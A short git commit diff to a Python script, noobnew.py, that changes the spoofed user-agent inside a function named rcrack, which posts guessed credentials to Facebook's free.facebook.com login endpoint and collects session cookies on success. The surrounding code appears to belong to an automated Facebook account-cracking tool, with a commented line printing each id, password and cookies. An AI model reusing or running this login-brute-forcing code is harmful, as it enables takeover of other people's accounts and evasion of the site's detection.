155eba423d8d8ec2c088bf033c3822a4d6cdae36
Hami12011 <98381490+Hami12011@users.noreply.github.com>
2023-05-08 10:01:57 +0500

    Add files via upload

--- noobnew.py
+++ noobnew.py
@@ -1881,7 +1881,7 @@ def rcrack(uid,pwx,tl):
              'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
-             'user-agent':'Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5656.194 Safari/537.36 OPR/97.0.4300.82"}
+             'user-agent':'Mozilla/5.0 (Linux; U; Android 10; vi-vn; Redmi K20 Pro Build/QKQ1.190716.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
